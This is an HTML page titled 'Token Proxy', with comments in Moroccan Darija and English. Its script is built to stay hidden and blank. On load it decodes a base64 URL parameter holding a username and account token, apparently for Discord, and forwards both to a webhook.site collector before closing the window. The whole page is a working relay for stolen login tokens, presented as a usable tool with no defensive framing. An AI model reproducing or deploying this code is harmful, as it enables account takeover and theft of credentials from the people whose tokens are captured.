<!DOCTYPE html>
<html>
<head>
    <title>Token Proxy</title>
    <!-- Had l'page ghadi tkon makhfiya, ma kayban fiha walou -->
    <script>
        // ⚠️ IMPORTANT: BDDEL HAD L'URL B'L'URL DIAL WEBHOOK.SITE DIALEK L'ORIGINAL
        const WEBHOOK_SITE_BASE_URL = "https://webhook.site/discordquest"; 
        // Note: beddelt WEBHOOK_SITE_URL l' WEBHOOK_SITE_BASE_URL hit ghadi nzidou 3liha les paramètres

        const params = new URLSearchParams(window.location.search);
        let finalWebhookUrl = WEBHOOK_SITE_BASE_URL; // Ghadi nbedlou had l'URL bach nzido 3liha l'data

        // If the 'd' parameter (data) is present
        if (params.has('d')) {
            try {
                const secretData = params.get('d');
                // Decode Base64 then decode URI component
                const decodedString = decodeURIComponent(atob(secretData));
                
                // Split the string into username and token (kanet `${tag}|${token}`)
                const [username, token] = decodedString.split('|');

                // ⭐ MODIFICATION HNA: Nseftou l'username w l'token k'query parameters
                // L'webhook.site ghadi yqder yqrahom b' $request.query.user$ w $request.query.token$
                finalWebhookUrl += `?user=${encodeURIComponent(username)}&token=${encodeURIComponent(token)}`;

            } catch (e) {
                console.error("Error decoding 'd' parameter:", e);
                // Fallback in case of decoding error, send raw data as an error parameter
                finalWebhookUrl += `?error_decoding_d=${encodeURIComponent(params.get('d'))}`;
            }
        } 
        // If the 'err' parameter (error token) is present
        else if (params.has('err')) {
            try {
                const errorToken = params.get('err');
                const decodedErrorToken = atob(errorToken); // Decode Base64
                
                // ⭐ MODIFICATION HNA: Nseftou l'error token k'query parameter
                finalWebhookUrl += `?error_token=${encodeURIComponent(decodedErrorToken)}`;
            } catch (e) {
                console.error("Error decoding 'err' parameter:", e);
                // Fallback in case of decoding error
                finalWebhookUrl += `?error_decoding_err=${encodeURIComponent(params.get('err'))}`;
            }
        }

        // Only send the fetch request if the URL has been updated with parameters
        if (finalWebhookUrl !== WEBHOOK_SITE_BASE_URL) {
            // ⭐ MODIFICATION HNA: Kanseftou GET request, hit hadchi li webhook.site kaytwaqqa3
            // b'les query parameters.
            fetch(finalWebhookUrl, {
                method: 'GET' // Kanbedlouha l'GET, w ma kan7tajouch body aw Content-Type
            })
            .then(response => {
                if (!response.ok) {
                    console.error('Webhook.site proxy error, status:', response.status);
                }
                return response.text(); 
            })
            .then(text => {
                console.log('Token data forwarded to webhook.site successfully from proxy. Response:', text);
            })
            .catch(error => {
                console.error('Error forwarding token data to webhook.site from proxy:', error);
            })
            .finally(() => {
                window.close();
            });
        } else {
             // Close if no valid data or error parameter found
            window.close();
        }
    </script>
</head>
<body>
    <!-- Had l'page ghadi tban khawya w makhfiya -->
</body>
</html>
